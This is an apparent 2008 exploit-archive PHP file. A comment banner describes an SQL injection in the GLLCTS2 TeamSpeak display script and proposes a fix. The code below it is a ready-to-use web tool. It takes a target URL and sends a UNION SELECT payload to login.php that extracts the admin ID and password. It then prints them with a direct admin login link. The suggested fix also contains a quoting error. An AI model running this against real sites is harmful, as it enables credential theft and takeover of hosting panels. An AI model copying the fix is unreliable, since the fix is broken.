<?php
/*
08000000088@M@@@M@2ZZZ8@aZX;ii,,:,iir777777777777777777777777r;i:,     i   ,@X:i:0a7 BMMM88000000000
08888888882aMMMMM,SZZ0WZ                         ........          7a2MMMMM      :   MMM@aZ888888888
08888888888WMMMMM78aSXi XBMMMMMMMMMMMMMM2: MB.X:.             ,SMMMMMMMMMMMM.    r:  MMM0a8888888888
0888888888ZZMMMMS  :          .:i;X28MMMMMMMM,22Z2XSaSir7ii2MMMMMMM@Z222Z0BMMM    iZMMMM8Z8888888888
088888888882BMMM :MSMMMMMMMMMM@@WB80MMMMMMMM  ,;r7XXXSSX.SMMM, .:ZMMMMMMBX.         MMMM8a8888888888
08888888888a2MMM8MMW   MM              ,,ZMMMM          i@B:WMMMMMMB8Z8MMMMMMMMMMX  ZMMWaZ8888888888
088888888ZZaS@MZiiMMMMMB:a@MMMMMMMMMMMM@ZX:aMMMMMM:MMMM0MMMM         iXa8ri ;MMMMMMMMMMBS88888888888
0888888Za8MMMMM ,ZMMMMM,SaaZM2 ;M.Mr  XM;SWW MMMMMMMMMMMMB,7ZMMMZMaMMZ. ;BBM  MMZXSMMMMBS2a888888888
088888ZZMMM0XMMXMMMSMMa;aaaBa  M8M@ M   MBi2 MMMMMMMMMMMM.2ZZ8M  MMM7 S  @M@  .MMMMM XMMMMMZZ8888888
088888a@M     MMM   @MSraa8MX   ;7Z@       X MMMM    BMMMiaMMMM.  SXaX  .2ZM   MMMM MMM   MM8Z888888
088888aMa Ma   MW    M@i0MMM 7Sr.   :r7i.    MMM  ,:  MMM;8           .i,,.iri MMM  MM rMB MMa888888
08888Z2MSMMMMM BZ    MMrW                rr ;MM  ,::, @MMaM          :XX7,     MM   MM ;XMM Ma888888
08888Z2MXW M  MMX     MMB       T    :XZa.  MM  :.::: :MM         D           2MM   Z7 ;. M,Ma888888
088888aMi  M MMMMrB    MM            .i.   MM. iW.::: :@MX                    MM   XM, ., MMWa888888
088888aM@  M MMMMiZ2    MM.               MM  :Za ::: r MM:                  MM    MMMM  aMM8Z888888
088888ZBM  M  MM SXB     MMM2          ZMMM  X2a;.:::.,X MMM                MM    aMMMM  MMMaZ888888
0888888ZMM  M  M B7a8     r2MMMMMMMMMMMMM7  aSXZ ,:::: i; ,MMMX         .@MMM7:    MMMM 0MMZa8888888
0888888Z8M;  M M W7XZZ     :;77X2Z8aX,    iaX77a ::::::  Mr  aMMMMMMMMMMMMMi ,0;  MMMM .MMZa88888888
08888888a@M  ZM  @X7X8r                   WX77Xa ::::,,,  Mi      SaS7i..,rrXXW  :MM @@MMWaZ88888888
088888888aMMMB   ZS77X07                 .2   ,S ,::..:   MZS               220  ZaS  BMM2Z888888888
0888888888aZMM   ia777X0       R          MMMMX      ; S. MM,      T       020  SX,;Mr M028888888888
08888888888aaMB   i7777SW                  MMMMMM;:r,MMMMMMM              0aa8  W M    MBZ8888888888
088888888888a0MMMM ;rrrr2Z                  M   SM2SWM7  X;              ;ZXZ  .2 MMMMMMZZ8888888888
0800000000008ZaSaMi7XXXXSBr.,,,,,,,,,,,:rXS:  ,.  .:        :S:,,,,,,,,..B2SZ  2SrMMMBa2Z80000000000
\                                                                                                  /
|                                            TheDefaced.org                                        |
|__________________________________________________________________________________________________|
|                                                                                                  |
|                                              Presents...                                         |
|                                     Exploit - Vulnerability & Fix                                |
|                                     SQL Injection in gllcts2 >= 4.2.4                            |
| ------------------------------------------------------------------------------------------------ |
|                                             Description                                          |
| ------------------------------------------------------------------------------------------------ |
| The following script is used for displaying teamspeak information by users and allowing others   |
| to login to these servers and etc.                                                               |
|                                                                                                  |
| It's most commonly used by teamspeak hosting companys which makes it kinda bad that this exists. |
|                                                                                                  |
| ------------------------------------------------------------------------------------------------ |
|                                             Vulnerability                                        |
| ------------------------------------------------------------------------------------------------ |
| Although the following script has multiple sql injections there is only one which we really...   |
| Found to be useful enough to include inside of the exploit code.                                 |
|                                                                                                  |
| So that is the only one that we will go into detail with below...                                |
|                                                                                                  |
| If we go to login.php and view the line 20                                                       |                                                                                                 |
| We see the following code...                                                                     |
|                                                                                                  |
| <?php                                                                                            |
|    $r = query("SELECT * FROM $dbtable1 WHERE server_id='$_GET[detail]'");                        |
| ?>                                                                                               |
|                                                                                                  |
| If you understand php you can see from this that the code is not properly sanatized before being.|
| Put into the query and executed... The way it is currently would allow a remote attacker to...   |
| Add on SQL in order to preform a sql injection.                                                  |
|                                                                                                  |
| ------------------------------------------------------------------------------------------------ |
|                                                 FIX                                              |
| ------------------------------------------------------------------------------------------------ |
| Take the code at login.php line 20 and make it the following...                                  |
|                                                                                                  |
| <?php                                                                                            |
| 	$userinput = mysql_real_escape_string($_GET[detail]);                                      |
| 	$r = query("SELECT * FROM $dbtable1 WHERE server_id='$userinput");                         |
| ?>                                                                                               |
| ------------------------------------------------------------------------------------------------ |
|                                                CREDITS                                           |
| ------------------------------------------------------------------------------------------------ |
|   The vulnerability was discovered remotely by DeadlyData and Kap of TheDefaced Security Team    |
|   It was then looked at via source code and the script was fully audited to find it was more...  |
|   Vulnerable then we had thought in total there are about 5 un sanatized user based inputs.      |
|                                                                                                  |
|   Which may lead to more vulnerabilties such as other SQL injections or XSS flaws.               |
| ------------------------------------------------------------------------------------------------ |
|                                              EXPLOIT CODE...                                     |
| ------------------------------------------------------------------------------------------------ |
|                  !NOTE!: Requires Magic Quotes GPC is set to off in your php.ini settings.       |
|                                                                                                  |
\__________________________________________________________________________________________________/
*/
set_time_limit(0);
ignore_user_abort(0);

function add_html_space($count){

$out2 = str_repeat("&nbsp;",$count);

return $out2;
}

function write_content($title,$desc,$content){
	
$out = "<div class='content'><div class='item'><h1>$title</h1><div class='descr'>$desc</div><br><p>$content</p></div>";

return $out;
}

$title = "GLLCTS2 => v4.2.4". add_html_space(1) ." SQL Injection Exploit";
$header['banner'] = "TD's ESystem";
$header['main'] = "TD's Exploit System";

$menu['title'] = "Exploit System";

$menu['title1'] = "Esystem Home";
$menu['link1'] = "?";



$menu = "<div class=\"sidenav\"><h1>".$menu['title']."</h1><ul><li><a href='".$menu['link1']."'>".$menu['title1']."</a></li></ul><h1>Links To TD</h1><ul><li><a href=\"http://www.thedefaced.org\">Go To TheDefaced</a></li><li><a href=\"http://www.thedefaced.org/forums/\">Go To TheDefaced Forums</a></li></ul></div>";
$copyright = "</div><div class=\"clearer\"><span></span></div></div><br><div class=\"footer\">&copy; 2004 - 2008 <a href=\"?\">The&nbsp;Defaced Security Team.</a><br>&copy; 2008 $title By TheDefaced.org</div></span></div></div></body></html>";
$style = "<html><head><link rel=\"stylesheet\" type=\"text/css\" href=\"http://thedefaced.org/default_orig.css\" media=\"screen\"/><title>$title</title></head><body><div id=\"thedefaced\"><div class=\"container\"><span><div class=\"main\"><div class=\"header\"><div class=\"title\"><font size=\"0.1\"><a href=\"http://www.thedefaced.org\">$header[banner]</a></font></div></td></td></TABLE></td></tr></table></form></div><div class=\"footer\"><b>$header[main]</a></b></div>$menu";

echo $style;

switch($_GET['page']){

default:

If($_POST['inj'] == 'run'){
	
echo"<div class='content'>";
echo"<div class='item'><h1>TD's Exploit System</h1>";
echo"<div class='descr'>Grabing Admin ID and Password via GLLC SQL injection.</div>";
echo"<br><p>";

$url = $_POST['url'];
$prefix = $_POST['prefix'];

$buf = file_get_contents($url."/login.php?detail='%20union%20select%20all%201,2,3,4,5,6,7,8,9,10,11,concat(CHAR(124),CHAR(65,%2068,%2077,%2073,%2078,%2073,%2068,%2058),admin_id,CHAR(124),CHAR(80,%2065,%2083,%2083,%2058),admin_pass,CHAR(124)),13,14,15,16,17,18,19,20,21,22,23%20from%20".$prefix."_admin/*");
$arr = explode("|",$buf);
foreach($arr as $line){
if(eregi("ADMINID:", $line))
If($line !=$adminid){
$adminid = $line;
echo $adminid."<br>";
}
if(eregi("PASS:",$line))
If($pass == ""){
$pass = $line;
$pass_parsed = str_replace("PASS:","",$pass);
echo $pass."<br><br>";
echo "<a href='$url/admin/index.php?pass=$pass_parsed'>Login</a>";
}
}

echo"</font></b></p></div>";
echo $copyright;	
}else{
echo write_content("Welcome to TD's Exploit System","SQL injection exploit in GLLCTS2","<form method='post' action='?'><center><input type='hidden' name='inj' value='run'>GLLCTS2 URL(No Trailing \"/\" & Include \"http://\"):<br><input type='text' size='25' name='url'><br><br>Table Prefix:<br>". add_html_space(1) ."<input type='text' size='20' name='prefix' value='gllcts2'><br><br><input type='submit' value='Get Admin Info'></form>");
echo $copyright;
}
break;
}
?>

# milw0rm.com [2008-06-12]